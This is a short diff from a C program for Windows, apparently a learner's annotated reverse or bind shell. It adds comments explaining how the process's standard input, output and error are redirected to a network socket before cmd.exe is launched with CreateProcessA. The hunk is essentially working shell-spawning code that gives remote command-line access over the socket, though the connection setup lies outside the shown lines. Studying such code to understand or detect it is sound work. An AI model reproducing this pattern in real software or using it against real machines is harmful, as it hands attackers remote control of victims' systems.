@@ -32,10 +32,15 @@ int main(int argc, char *argv[]){
   memset(&sinfo, 0, sizeof(sinfo)); // filling all the sinfo struct with zeros
   sinfo.cb = sizeof(sinfo);
   sinfo.dwFlags = STARTF_USESTDHANDLES;
+  // with these fields, all that the process shows is not displayed on screen, but goes through websockets. 
+  // Traditionnaly, STDOUT is linked to "console". But here Stdout is linked to the socket network directly.
+  // Therefore the text is written directly in the socket.
   sinfo.hStdError  = (HANDLE)windowSock;
   sinfo.hStdInput  = (HANDLE)windowSock;
   sinfo.hStdOutput = (HANDLE)windowSock;
 
+  // creates a new Windows processus, cmd.exe 
+  // sinfo adds instructions to the processus. With sinfo, the processus is told exactly how to be initialized. 
   CreateProcessA(NULL, "cmd.exe", NULL, NULL,TRUE , 0, NULL, NULL, &sinfo, &pinfo);
 
   return 0;
